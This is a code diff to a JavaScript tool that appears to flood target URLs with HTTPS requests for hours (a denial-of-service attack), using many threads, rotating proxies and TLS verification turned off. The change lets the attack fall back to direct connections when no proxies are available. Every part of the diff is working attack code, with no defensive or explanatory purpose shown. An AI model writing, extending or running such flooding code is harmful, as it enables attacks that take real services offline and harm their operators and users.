@@ -69,22 +69,26 @@ const getNoCacheHeaders = () => {
   };
 };
 
-const createHttpsAgent = (proxyUrl, proxyProtocol) => {
-  const agentConfig = {
-    ciphers: SELECTED_CIPHER,
-    honorCipherOrder: true,
-    rejectUnauthorized: false,
-    keepAlive: false,
-    timeout: 0,
-  };
+const getAgentConfig = () => ({
+  ciphers: SELECTED_CIPHER,
+  honorCipherOrder: true,
+  rejectUnauthorized: false,
+  keepAlive: false,
+  timeout: 0,
+});
 
+const createDirectAgent = () => {
+  return new https.Agent(getAgentConfig());
+};
+
+const createProxyAgent = (proxyUrl, proxyProtocol) => {
   if (proxyProtocol === "socks5") {
     const agent = new SocksProxyAgent(proxyUrl);
-    agent.options.secureOptions = agentConfig;
+    agent.options.secureOptions = getAgentConfig();
     return agent;
   } else {
     const proxyAgent = new HttpsProxyAgent(proxyUrl);
-    proxyAgent.secureOptions = agentConfig;
+    proxyAgent.secureOptions = getAgentConfig();
     return proxyAgent;
   }
 };
@@ -240,12 +244,21 @@ const resumeAttack = async () => {
     console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
     
     const proxies = loadProxies();
+    
+    activeThreads = [];
+    
     if (!proxies.length) {
-      console.log(colors.red('No proxies found for resume'));
+      console.log(colors.yellow('No proxies found — using direct connections'));
+      const agent = createDirectAgent();
+      for (let i = 0; i < numThreads; i++) {
+        if (!continueAttack) break;
+        performAttack(currentTarget, agent, i);
+        activeThreads.push(i);
+      }
+      console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct)`));
       return;
     }
 
-    activeThreads = [];
     for (let i = 0; i < numThreads; i++) {
       if (!continueAttack) break;
 
@@ -262,13 +275,13 @@ const resumeAttack = async () => {
       }
       
       const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
-      const agent = createHttpsAgent(proxyUrl, proxyProtocol);
+      const agent = createProxyAgent(proxyUrl, proxyProtocol);
       
       performAttack(currentTarget, agent, i);
       activeThreads.push(i);
     }
     
-    console.log(colors.green(`Resumed with ${activeThreads.length} threads`));
+    console.log(colors.green(`Resumed with ${activeThreads.length} threads (proxied)`));
   }
 };
 
@@ -324,16 +337,12 @@ const startAttack = async (url, durationHours) => {
     return false;
   }
 
-  const proxies = loadProxies();
-  if (!proxies.length) {
-    console.log(colors.red('No proxies found in proxy.txt'));
-    return false;
-  }
-
   if (continueAttack) {
     console.log(colors.yellow('Attack already running, adding to queue instead'));
     return await addToQueue(url, durationHours);
   }
+
+  const proxies = loadProxies();
 
   resetTotal();
   targetQueue = [];
@@ -348,8 +357,9 @@ const startAttack = async (url, durationHours) => {
   state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
+  const mode = proxies.length ? 'proxied' : 'direct';
   console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
-  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD}`));
+  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD} | Mode: ${mode}`));
   console.log(colors.magenta(`Queue size: ${MAX_QUEUE}`));
   
   if (tunnelActive && nportUrl) {
@@ -361,21 +371,25 @@ const startAttack = async (url, durationHours) => {
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
 
-    const proxies = loadProxies();
-    const randomProxy = getRandomElement(proxies);
-    const proxyParts = randomProxy.split(":");
-    
-    let proxyProtocol = "http";
-    let proxyHost = proxyParts[0];
-    let proxyPort = proxyParts[1];
-    
-    if (proxyHost.includes("socks")) {
-      proxyProtocol = "socks5";
-      proxyHost = proxyParts[0].replace("socks5://", "").replace("socks4://", "");
+    let agent;
+    if (proxies.length) {
+      const randomProxy = getRandomElement(proxies);
+      const proxyParts = randomProxy.split(":");
+      
+      let proxyProtocol = "http";
+      let proxyHost = proxyParts[0];
+      let proxyPort = proxyParts[1];
+      
+      if (proxyHost.includes("socks")) {
+        proxyProtocol = "socks5";
+        proxyHost = proxyParts[0].replace("socks5://", "").replace("socks4://", "");
+      }
+      
+      const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
+      agent = createProxyAgent(proxyUrl, proxyProtocol);
+    } else {
+      agent = createDirectAgent();
     }
-    
-    const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
-    const agent = createHttpsAgent(proxyUrl, proxyProtocol);
     
     performAttack(currentTarget, agent, i);
     activeThreads.push(i);
